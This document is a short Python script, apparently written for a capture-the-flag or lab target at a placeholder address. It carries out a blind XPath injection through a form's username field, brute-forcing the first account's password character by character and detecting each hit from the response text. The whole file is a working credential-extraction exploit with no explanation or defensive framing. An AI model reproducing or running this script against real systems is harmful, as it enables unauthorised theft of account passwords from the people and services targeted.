import requests
from tqdm import tqdm

# List of all ASCII characters
ascii_chars = [chr(i) for i in range(32, 127)]

# Set the target URL
url = "http://ip:port/"

# Create headers to mimic the behavior of the working request
headers = {
    "Host": "ip:port",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36",
    "Connection": "close"
}

# Create the payload template, where 'count' and 'char' will be replaced in each iteration
base_payload = "username=test'+or+substring(/accounts/acc[1]/password,{count},1)='{char}'+and+'1'='1&msg=blah"

# Iterate over each count from 1 to 35
for count in range(1, 36):
    # Iterate over each ASCII character
    for char in tqdm(ascii_chars, desc=f"Testing count {count}", unit="char"):
        # Replace '{count}' and '{char}' with the current values
        payload = base_payload.format(count=count, char=char)

        # Send the request
        response = requests.post(url, headers=headers, data=payload)

        # Only print successful characters
        if "Message successfully sent!" in response.text:
            print(f"Success: Char '{char}' at count {count} is correct.")
            break  # Exit the inner loop once the success message is found
